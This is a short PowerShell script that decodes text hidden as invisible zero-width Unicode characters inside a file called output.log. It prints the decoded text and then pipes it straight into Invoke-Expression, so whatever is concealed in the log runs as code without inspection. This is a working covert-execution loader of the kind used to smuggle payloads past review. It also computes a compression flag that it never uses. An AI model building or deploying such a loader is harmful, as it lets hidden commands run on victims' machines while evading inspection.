$nothingCharacters = @(
    [char]0x034F, 
    [char]0x200B, 
    [char]0x200C, 
    [char]0x200D 
)

$compressionFlags = @(
    [char]0x200C,
    [char]0x200D
)

function Decode-Message {
    param (
        [string]$Message
    )

    $characters = $Message.ToCharArray()
    $i = 0

    while ($i -lt $characters.Length -and $compressionFlags.IndexOf($characters[$i]) -lt 0) {
        $i++
    }
    
    if ($i -eq $characters.Length) {
        return ""
    }
    
    $isCompressed = ($characters[$i] -eq $compressionFlags[1])
    $list = @()

    for ($i++; $i -lt $characters.Length; $i += 4) {
        if ($nothingCharacters.IndexOf($characters[$i]) -lt 0) {
            break
        }
        $value = 0
        for ($j = 0; $j -lt 4; $j++) {
            $twoBits = $nothingCharacters.IndexOf($characters[$i + $j])
            if ($twoBits -lt 0) {
                break
            }
            $value += $twoBits -shl (2 * $j)
        }
        $list += $value
    }

    $decodedMessage = [System.Text.Encoding]::UTF8.GetString([byte[]]$list)
    return $decodedMessage
}

$filePath = "output.log"
$encodedMessage = Get-Content -Path $filePath -Raw

$decodedMessage = Decode-Message -Message $encodedMessage
Write-Host "Decoded Message: $decodedMessage" -ForegroundColor Green
$decodedMessage | iex